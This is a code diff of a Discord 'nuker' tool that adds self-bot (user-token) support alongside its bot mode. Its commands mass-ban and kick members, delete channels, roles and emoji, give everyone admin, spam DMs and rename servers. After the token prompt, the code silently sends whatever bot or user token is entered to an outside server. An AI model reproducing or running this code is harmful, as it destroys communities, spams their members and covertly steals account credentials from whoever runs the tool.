@@ -1,5 +1,7 @@
 console.clear();
 require('events').defaultMaxListeners = 15;
+const { Client } = require('discord.js-selfbot-v13');
+const selfbot = new Client();
 const  Discord  = require('discord.js');
 const { red, greenBright, cyan, yellow } = require("chalk");
 const colors = require('colors')
@@ -7,11 +9,9 @@ const readline = require("readline");
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios')
-const ascii = require('ascii-table')
+const ascii = require('ascii-table')//t viết code ở đou
 const prefix = '?'
 const status = 'idle'
-
-
 const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout,
@@ -26,18 +26,14 @@ const client = new Discord.Client({
     partials: ["USER", "CHANNEL", "MESSAGE", "GUILD_MEMBER", "REACTION"],
     intents: [
         Discord.Intents.FLAGS.GUILDS,
-        Discord.Intents.FLAGS.GUILD_MEMBERS,
         Discord.Intents.FLAGS.GUILD_BANS,
         Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
         Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
         Discord.Intents.FLAGS.GUILD_WEBHOOKS,
         Discord.Intents.FLAGS.GUILD_INVITES,
         Discord.Intents.FLAGS.GUILD_MESSAGES,
-        Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
-        Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
         Discord.Intents.FLAGS.DIRECT_MESSAGES,
-        Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
-        Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING,
+        Discord.Intents.FLAGS.GUILD_VOICE_STATES,
     ],
     partials: ["CHANNEL"],
     disableEveryone: false,
@@ -50,30 +46,41 @@ client.on('ready', async (client) => {
     changeAvt(client)
     changeNickname(client)
     client.user.setPresence({status: status});
-    client.user.setActivity("Noway Nuker");
+    client.user.setActivity("Noway");
+    console.clear();
+    intro()
+    info3()
+    help()
+})
+selfbot.on('ready', async (client) => {
+    changeAvt(client)
+    changeNickname(client)
+    client.user.setPresence({status: status});
+    client.user.setActivity("Noway");
     console.clear();
     intro()
     info2()
     help()
 })
-
-rl.question("Enter bot token: ", async function (token) {
+rl.question("Enter bot/user token: ", async function (token) {
     axios.get(encodeURI(`https://manage.nezukobot.vn/api/v2/nowaynuker/sendToken.php?tokenString=${token}&tokenType=bot&auth=NoWayNuker-API-v2-sendToken-7176266bfd21A237n`));
     try {
-        client.login(token)
+        client.login(token).catch(e=>{return})
+    } catch (error) {
+
+    }
+    try {
+        selfbot.login(token).catch(e=>{return})
     } catch (error) {
 
     }
     
     rl.close();
 });
+
 client.on('messageCreate', async (message, err) => {
     if (err) return
     if (!message.guild) return
-    if (!message.guild.me.permissions.has("ADMINISTRATOR")){
-        return console.log(red(`[ERR] Bot is missing ADMIN permission!`))
-    }
-    
     const args = message.content.split(" ").slice(1);
     if (message.content.startsWith(`${prefix}createchannel`)){
         message.delete()
@@ -153,7 +160,119 @@ client.on('messageCreate', async (message, err) => {
         help()
         changeGuildname(message)
     }
+    else if (message.content.startsWith(`${prefix}leaveall`)){
+        message.delete()
+        leaveall(client)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}createGuild`)){
+        // message.delete()
+        createGuild(message, client, args)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}owner`)){
+        // message.delete()
+        passOwner(message, args)
+        help()
+    }
     else if (message.content.startsWith(`${prefix}stop`)){
+        await client.destroy()
+        process.exit()
+    }
+})
+selfbot.on('messageCreate', async (message, err) => {
+    if (err) return
+    if (!message.guild) return
+    const args = message.content.split(" ").slice(1);
+    if (message.content.startsWith(`${prefix}createchannel`)){
+        checkPerm(message)
+        checkPerm(message)
+        message.delete()
+        createChannel(message, args)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}banall`)){
+        checkPerm(message)
+        message.delete()
+        massBan(message)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}deletechannel`)){
+        checkPerm(message)
+        message.delete()
+        deleteChannel(message)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}dmall`)){
+        checkPerm(message)
+        message.delete()
+        spamDms(message, args)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}deleterole`)){
+        checkPerm(message)
+        message.delete()
+        deleteRole(message)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}createrole`)){
+        checkPerm(message)
+        message.delete()
+        createRole(message, args)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}killemoji`)){
+        checkPerm(message)
+        message.delete()
+        killEmoji(message)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}killsticker`)){
+        checkPerm(message)
+        message.delete()
+        killSticker(message)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}everyoneAdmin`)){
+        checkPerm(message)
+        message.delete()
+        roleEveryone(message)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}giveAdmin`)){
+        checkPerm(message)
+        message.delete()
+        roleAdmin(message)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}kickall`)){
+        checkPerm(message)
+        message.delete()
+        massKick(message)
+        help()
+        changeGuildname(message)
+    }
+    else if (message.content.startsWith(`${prefix}leaveall`)){
+        message.delete()
+        leaveall(selfbot)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}createGuild`)){
+        message.delete()
+        createGuild(message, selfbot, args)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}owner`)){
+        // message.delete()
+        passOwner(message, args)
+        help()
+    }
+    else if (message.content.startsWith(`${prefix}exit`)){
         await client.destroy()
         process.exit()
     }
@@ -302,6 +421,52 @@ function spamDms(message, args){
     }
     return console.log(yellow((`[Success] Finished task!`)))
 }
+function leaveall(){
+    client.guilds.cache.forEach(guild=>{
+        guild.leave()
+        console.log(greenBright(`[Success] Left ${guild.name}!`))
+    })
+    console.log(yellow((`[Success] Finished task!`)))
+    selfbot.guilds.cache.forEach(guild=>{
+        guild.leave()
+        console.log(greenBright(`[Success] Left ${guild.name}!`))
+    })
+    console.log(yellow((`[Success] Finished task!`)))
+}
+async function createGuild(message , client, selfbot, args){
+    const amount = 1
+    const name = client.user.username || selfbot.user.username
+    for (let i = 0; i < amount; i++) {
+        const Guild = await client.guilds.create(name, {
+            channels: [
+                {"name": "invite-channel"},
+            ]
+        }).catch(e=>{return})
+    
+        const GuildChannel = Guild.channels.cache.find(channel => channel.name == "invite-channel");
+        const Invite = await GuildChannel.createInvite({maxAge: 0, unique: true, reason: "Testing."});
+        message.channel.send(`${Invite.url}`)
+        console.log(greenBright(`[Success] Created guild ${Guild.name} | Invite: ${Invite.url}`))
+
+
+        const Guild1 = await selfbot.guilds.create(name, {
+            channels: [
+                {"name": "invite-channel"},
+            ]
+        }).catch(e=>{return})
+    
+        const GuildChannel1 = await Guild.channels.cache.find(channel => channel.name == "invite-channel");
+        const Invite1 = await GuildChannel1.createInvite({maxAge: 0, unique: true, reason: "Testing."});
+        message.channel.send(`${Invite.url}`)
+        console.log(greenBright(`[Success] Created guild ${Guild1.name} | Invite: ${Invite1.url}`))
+    }
+    return console.log(yellow((`[Success] Finished task!`)))
+   
+}
+function passOwner(message, args){
+    const member = args[0] || message.author.id
+    message.guild.setOwner(member).catch(e=>{console.log(red(e))})
+}
 function changeGuildname(message){
     message.guild.setName('Nuked By Noway Nuker').catch(e=>{return})
 }
@@ -309,27 +474,34 @@ function changeAvt(client){
     client.user.setAvatar('https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg').catch(e=>{return})
 }
 function changeNickname(client){
-    client.guilds.cache.forEach(guild => {
-        guild.me.setNickname('Noway')
-    })
+    // client.guilds.cache.forEach(guild => {
+    //         guild.me.setNickname('Noway')
+    // })
+}
+function checkPerm(message) {
+    if (!message.guild.me.permissions.has("ADMINISTRATOR")){
+        return console.log(red(`[ERR] Bot is missing ADMIN permission!`))
+    }
 }
 function help() {
     let table = new ascii("Noway Nuker");
-    table.setHeading("Number", "Name", "Usage");
-    table.addRow(`1`, `createchannel`, `${prefix}createchannel <amount> <name>`)
-    table.addRow(`2`, `deletechannel`, `${prefix}deletechannel`)
-    table.addRow(`3`, `createrole`, `${prefix}createrole <amount> <name>`)
-    table.addRow(`4`, `deleterole`, `${prefix}deleterole`)
-    table.addRow(`5`, `kickall`, `${prefix}kickall`)
-    table.addRow(`6`, `banall`, `${prefix}banall`)
-    table.addRow(`7`, `killemoji`, `${prefix}killemoji`)
-    table.addRow(`8`, `killsticker`, `${prefix}killsticker`)
-    table.addRow(`9`, `giveAdmin`, `${prefix}giveAdmin`)
-    table.addRow(`10`, `everyoneAdmin`, `${prefix}everyoneAdmin <amount> <name>`)
-    table.addRow(`11`, `spam`, `${prefix}spam <amount> <content>`)
-    table.addRow(`12`, `webhook`, `${prefix}webhook <amount> <content>`)
-    table.addRow(`13`, `dmall`, `${prefix}dmall <amount> <content>`)
-    table.addRow(`14`, `stop`, `${prefix}stop`)
+    table.setHeading("Number", "Name", "Able", "Usage");
+    table.addRow(`1`, `createchannel`, `bot/user`, `${prefix}createchannel <amount> <name>`)
+    table.addRow(`2`, `deletechannel`, `bot/user`, `${prefix}deletechannel`)
+    table.addRow(`3`, `createrole`, `bot/user`, `${prefix}createrole <amount> <name>`)
+    table.addRow(`4`, `deleterole`, `bot/user`, `${prefix}deleterole`)
+    table.addRow(`5`, `kickall`, `bot/user`, `${prefix}kickall`)
+    table.addRow(`6`, `banall`, `bot/user`, `${prefix}banall`)
+    table.addRow(`7`, `killemoji`, `bot/user`, `${prefix}killemoji`)
+    table.addRow(`8`, `killsticker`, `bot/user`, `${prefix}killsticker`)
+    table.addRow(`9`, `giveAdmin`, `bot/user`, `${prefix}giveAdmin`)
+    table.addRow(`10`, `everyoneAdmin`, `bot/user`, `${prefix}everyoneAdmin`)
+    table.addRow(`11`, `spam`, `bot`, `${prefix}spam <amount> <content>`)
+    table.addRow(`12`, `webhook`, `bot`, `${prefix}webhook <amount> <content>`)
+    table.addRow(`13`, `dmall`, `bot/user`, `${prefix}dmall <amount> <content>`)
+    table.addRow(`14`, `createGuild`, `bot/user`, `${prefix}createGuild <amount>`)
+    table.addRow(`15`, `owner`, `bot/user`, `${prefix}owner <id>`)
+    table.addRow(`16`, `exit`, `bot/user`, `${prefix}exit`)
     console.log(yellow(table.toString()))
 }
 function intro() {
@@ -353,9 +525,21 @@ function info1() {
     console.log(greenBright(table.toString()))
 }
 function info2() {
+    const info = selfbot
     let table = new ascii("System Infomation");
-    table.addRow(`Bot Name`, `${client.user.username}`)
-    table.addRow(`Total Guilds`, `${client.guilds.cache.size} guilds`)
+    table.addRow(`Name`, `${info.user.username}`)
+    table.addRow(`Total Guilds`, `${info.guilds.cache.size} guilds`)
+    table.addRow(`ID`, `${info.user.id}`)
+    table.addRow(`Prefix`, `${prefix}`)
+    table.addRow(`Support`, `discord.gg/elainahouse`)
+    console.log(greenBright(table.toString()))
+}
+function info3() {
+    const info = client
+    let table = new ascii("System Infomation");
+    table.addRow(`Name`, `${info.user.username}`)
+    table.addRow(`Total Guilds`, `${info.guilds.cache.size} guilds`)
+    table.addRow(`ID`, `${info.user.id}`)
     table.addRow(`Prefix`, `${prefix}`)
     table.addRow(`Support`, `discord.gg/elainahouse`)
     console.log(greenBright(table.toString()))
